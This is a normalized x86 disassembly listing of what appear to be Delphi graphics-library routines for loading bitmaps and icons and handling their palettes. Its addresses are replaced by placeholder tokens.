movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_425a10
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41b638
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402bf8
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41b5c8
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_425ca0
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_425cc0
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41b5c8
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_425b30
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42adef
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_425f68
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_40276c
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_42ad57
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41b5c8
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_425b30
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42ad2b
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_426220
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cfdc
call sub_425a10
jmp r-xdata
xor eax eax
push ebp
push sub_42adbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41b5c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ad32
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42adf6
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cfdc
call sub_425a10
jmp r-xdata
sub_42ad32
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_40278c
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_42adf6
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402bf8
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_42ae8b
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_426220
mov [ ebp - 0x30 ] eax
sub_42aea8
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_42a85c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42aeec
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42a58c
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41b5c8
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402bf8
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42a85c
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_42a984
call sub_425a10
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_42af5c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_42a58c
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402bf8
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_429ba4
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42aff7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42a85c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42b020
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_42a448
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_42a58c
mov eax esi
call sub_42a69c
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_42a58c
mov eax esi
call sub_42a69c
mov eax esi
call sub_42a518
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_429ba4
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_429fa8
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_42a85c
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_42a85c
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_429540
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42b158
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42a59c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_429fa8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42b1ac
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_42a59c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_429fa8
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42b22c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_42a58c
mov eax ebx
call sub_42a59c
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_429540
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b2c3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42a85c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_429438
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_423a18
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_42b2c8
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_4039e0
call sub_403a34
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_429438
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b300
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_42a59c
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_429fa8
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_42b350
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42a59c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_429fa8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42b3ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402bf8
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_42a518
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_426974
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41b600
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41b600
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402bf8
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_42a3dc
mov dl [ r-xdata ]
call sub_42580c
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_425b30
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_4294f4
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41b600
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41b600
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41b600
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41b600
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41b600
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41b600
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_425fa0
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41b600
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_4262c4
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_42b664
push ebx
mov ebx eax
mov eax ebx
call sub_42a59c
mov edx ebx
mov eax ebx
call sub_42a068
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
mov ecx edx
cmp edx [ eax + 0x14 ]
jne r-xdata
xor edx edx
mov [ eax + 0x8 ] edx
mov eax ecx
pop ebx
retn
xor edx edx
mov [ eax + 0x14 ] edx
xor edx edx
mov [ eax + 0x2c ] edx
sub_42b698
push ebx
mov ebx eax
mov eax ebx
call sub_42a59c
mov edx ebx
mov eax ebx
call sub_42a068
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x10 ]
xor ecx ecx
mov [ eax + 0x10 ] ecx
mov eax edx
pop ebx
retn
sub_42b6c4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_42a59c
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_429540
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42b73e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_429ba4
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42b764
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_42b7ac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_426cb0
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_42936c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_42b800
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_429370
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193ac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_42b830
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_42bb08
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_42936c
mov eax [ esi + 0x28 ]
call sub_429370
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4193d8
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_42b890
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_42580c
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_42b8e8
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_42b924
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41b3bc
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41b5c8
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_426570
jmp r-xdata
jmp r-xdata
call sub_425a1c
sub_42b99c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42ba29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42b8e8
cmp eax [ rw-data ]
jne r-xdata
call sub_425a1c
mov eax esi
call sub_42b8e8
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_426ab4
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402bf8
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41b600
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42ba50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42bade
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41b39c
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41b5c8
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41b5c8
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42bb08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_425a1c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bae3
mov eax [ ebp - 0x4 ]
call sub_4031ec
call sub_4039e0
call sub_403a34
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
